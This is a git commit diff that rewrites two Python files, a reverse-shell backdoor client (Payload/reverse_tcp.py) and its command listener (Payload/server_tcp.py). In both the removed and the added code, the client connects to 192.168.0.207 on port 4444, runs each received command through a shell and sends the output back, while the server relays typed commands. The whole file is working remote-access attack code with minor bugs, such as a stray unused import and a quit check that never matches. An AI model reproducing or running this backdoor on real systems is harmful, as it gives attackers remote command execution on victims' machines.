dbb3ecd8148bf3dd8f317bd6392bb8018c101f75
AzzDestrhoyer <fabriciososa006@gmail.com>
2022-04-22 15:08:11 -0300

    vamos

--- Payload/reverse_tcp.py
+++ Payload/reverse_tcp.py
@@ -1,36 +1,21 @@
 import socket
 import subprocess
-import json
 
-class Backdoor:
-	def __init__(self, ip, port):
-		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.connection.connect((ip, port))
+from pynvim import command
 
-	def reliable_send(self, data):
-		json_data = json.dumps(data)
-		self.connection.send(json_data)
+def ejecutar_comando(command):
+	return subprocess.check_output(command, shell=True)
 
-	def reliable_recv(self):
-		json_data = ""
-		while True:
-			try:
-				json_data = self.connection.recv(1024)
-				return json.loads(json_data)
-			except ValueError:
-				continue
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-	def ejecutar_comando(self, command):
-		return subprocess.check_output(command, shell=True)
+connection.connect(("192.168.0.207", 4444))
 
 
-	def run(self):
-		while True:
-			command = self.reliable_recv()
-			resultados_comando = self.ejecutar_comando(command)
-			self.reliable_send(resultados_comando)
 
-		connection.close()
+while True:
+	command = connection.recv(1024)
+	resultados_comando = ejecutar_comando(command)
+	connection.send(resultados_comando)
 
-puerta = Backdoor("192.168.0.207", 4444)
-puerta.run()
+
+connection.close()
--- Payload/server_tcp.py
+++ Payload/server_tcp.py
@@ -1,40 +1,19 @@
 import socket
-import json
 
-class Listener:
-	def __init__(self, ip, port):
-		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-		listener.bind((ip, port))
-		listener.listen(0)
+listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-		print("[+] Esperando por conexiones")
-		self.connection, address = listener.accept()
-		print("[+] Tenemos una conexion de " + str(address))
+listener.bind(("192.168.0.207", 4444))
+listener.listen(0)
 
+print("[+]Esperando por conexiones")
+connection, address = listener.accept()
+print("[+]Tenemos una conexion de " + str(address))
 
-	def reliable_send(self, data):
-		json_data = json.dumps(data)
-		self.connection.send(json_data)
-
-	def reliable_recv(self):
-		json_data = ""
-		while True:
-			try:
-				json_data = self.connection.recv(1024)
-				return json.loads(json_data)
-			except ValueError:
-				continue
-
-	def ejecutar_remoto(self, command):
-		self.reliable_send(command)
-		return self.reliable_recv()
-
-	def run(self):
-		while True:
-			command = input(">>")
-			result = self.ejecutar_remoto(command)
-			print(result)
-
-escuchar = Listener("192.168.0.207", 4444)
-escuchar.run()
+while True:
+	command = input("Shell>>")
+	if str.encode(command) =='q':break
+	if len(str.encode(command)) > 0:
+		connection.send(str.encode(command))
+		result = str(connection.recv(1024))
+		print(result)
